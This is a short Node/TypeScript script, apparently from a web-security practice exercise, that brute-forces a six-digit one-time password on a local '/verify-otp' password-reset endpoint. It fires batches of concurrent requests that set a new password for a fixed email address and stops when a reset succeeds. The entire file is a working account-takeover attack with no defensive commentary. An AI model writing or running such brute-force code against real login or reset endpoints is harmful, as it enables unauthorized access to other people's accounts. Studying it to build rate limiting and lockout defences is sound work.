
const axios = require('axios');
import { pad } from "./lib.ts";


console.log(pad(0));
console.log(pad(110));
console.log(pad(120));
console.log(pad(11000));


async function SendRequest(otp : string){
   let data = JSON.stringify({
        "email": "nik@gmail.com",
        "otp": otp,
        "newPassword": "ihackeduraccount"
    });

    let config = {
        method: 'post',
        maxBodyLength: Infinity,
        url: 'http://localhost:3000/verify-otp',
        headers: { 
            'Content-Type': 'application/json'
        },
        data : data
    };

    return axios.request(config)
}

async function main(){
    for(let i= 100000 ; i < 1000000; i+=500){
        let promises = [];
        console.log(`starting from ${pad(i)}`);
        for(let j = i; j < i + 500; j++){
            const paddedOtp = pad(j);
            promises.push(
                SendRequest(paddedOtp).then(res => {
                    if (res.data.success){
                        console.log("password correctly reset")
                        process.exit(0);
                    }
            }).catch(e => {e}));
        await Promise.all(promises);
        }
    }
}

main();